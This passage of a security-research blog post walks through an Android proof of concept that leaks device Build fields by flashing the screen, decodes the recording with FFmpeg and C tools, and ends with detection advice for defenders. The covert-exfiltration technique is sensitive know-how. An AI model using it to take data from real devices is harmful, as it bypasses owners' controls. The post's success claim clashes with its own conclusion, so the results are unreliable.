While FFmpeg is recording, open ReconCat Optical Recon and tap **Meow! ♥️** once. Keep the app in the foreground and the phone still until the status says the frame was sent.

![malware](/assets/images/236/photo_2026-11-23_02-27-48.jpg){:class="img-responsive"}    

![malware](/assets/images/236/photo_2026-11-23_02-27-48-2.jpg){:class="img-responsive"}    

![malware](/assets/images/236/photo_2026-11-23_02-27-48-3.jpg){:class="img-responsive"}    

![malware](/assets/images/236/photo_2026-11-23_02-28-11.jpg){:class="img-responsive"}    

![malware](/assets/images/236/photo_2026-11-23_02-42-30.jpg){:class="img-responsive"}    

![malware](/assets/images/236/photo_2026-11-23_02-42-35.jpg){:class="img-responsive"}    

Frame sent:    

![malware](/assets/images/236/photo_2026-11-23_02-28-11.jpg){:class="img-responsive"}    

![malware](/assets/images/236/photo_2026-11-23_02-41-49-2.jpg){:class="img-responsive"}    

![malware](/assets/images/236/photo_2026-11-23_02-41-49.jpg){:class="img-responsive"}    

![malware](/assets/images/236/2026-11-23_02-42.png){:class="img-responsive"}    

After recording finishes, run the C pipeline. FFmpeg decodes the video and normalizes it to 30 grayscale frames per second; center-sample extracts the central square automatically; receiver-recon searches, validates and saves the JSON:

```bash
set -o pipefail
ffmpeg -v error -i capture-part2.mp4 -an \
  -vf 'fps=30,scale=640:480:flags=area,format=gray' \
  -f rawvideo -pix_fmt gray - \
  | ./center-sample 640 480 48 \
  | ./receiver-recon - android_recon.json
```

The receiver prints the measured frame length, start time, half-bit estimate, checksum result and actual JSON from the recording. It writes the same JSON bytes to android_recon.json. I compare that output with the device fields and keep the video and receiver output together.      

![malware](/assets/images/236/2026-11-23_02-47.png){:class="img-responsive"}    

I recorded the complete transmission from the Motorola moto g54 with the ThinkPad X1 Carbon camera and decoded it with this pipeline. The sampler processed 23,400 frames and used the central `48x48` ROI at `(296,216)`. The receiver validated the 167-byte Build JSON with CRC32 `0x3369411d`, found the frame at `9.20 s`, and estimated a half-bit duration of `0.1670 s`. I compared the recovered JSON with the snapshot saved from the phone; `cmp` confirmed a byte-for-byte match. The screenshot above shows the receiver output and recovered Build fields.

![malware](/assets/images/236/photo_2026-11-23_02-50-33.jpg){:class="img-responsive"}    

### demo 2. replay the captured JSON

Once demo 1 has produced `android_recon.json`, I can repeat the decoder check without recording the phone again. This creates ideal samples from the actual recovered JSON, decodes them, and compares the resulting file byte for byte:

```bash
./trace-recon android_recon.json replay.u8
./receiver-recon replay.u8 replay.json
cmp android_recon.json replay.json
```

![malware](/assets/images/236/2026-11-23_02-57.png){:class="img-responsive"}    

![malware](/assets/images/236/2026-11-23_02-57_1.png){:class="img-responsive"}    

![malware](/assets/images/236/2026-11-23_02-58.png){:class="img-responsive"}    

This verifies the encoder, frame layout, checksums and decoder using the same JSON bytes. It is a software replay, not a second optical transmission.     

As you can see, everything works perfectly, as expected! Meow =^..^=!     

### for blue teams

The manifest and network policy alone do not describe every way an app can expose information. These nine Build fields are available through Android's API without runtime permissions, and this PoC has no INTERNET permission. The visible activity changes a large uniform screen region every 167 ms for several minutes; a camera with a clear view can record that pattern.

During analysis, inspect the app's Build API references and its foreground screen behavior. A fixed preamble, repeated Manchester transitions, a length field and checksums give a useful signal to look for in a recording. CRC validation confirms data integrity, not the sender's identity.

In Part 3, I will work on finding the signal patch when it is not centered and on logging rejected bit decisions. That will let me measure bit errors and repeated packet success from actual camera captures.

### conclusion

This part sends the same nine Android Build fields (infostealer PoC) as a length-prefixed, checksummed optical frame and recovers them with a C receiver. Part 1 established the physical optical path; I still need a complete camera recording to confirm this faster, longer Build JSON frame.    

I hope this post is useful for mathematicians, physicists, malware researchers, C and Linux programmers, spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.      

[Malware shellcode delivery via signal series - part 1](/malware/2026/05/24/malware-tricks-56.html)     
[Optical payload velivery - part 1](/research/2026/11/14/physical-covert-channels-1.html)    
[Manchester code](https://en.wikipedia.org/wiki/Manchester_code)    
[FFmpeg filter documentation](https://ffmpeg.org/ffmpeg-filters.html)    
[source code in github](https://github.com/cocomelonc/optical-malware-delivery-poc)     

> This is a practical case for educational purposes only.

Thanks for your time happy hacking and good bye!
*PS. All drawings and screenshots are mine.*

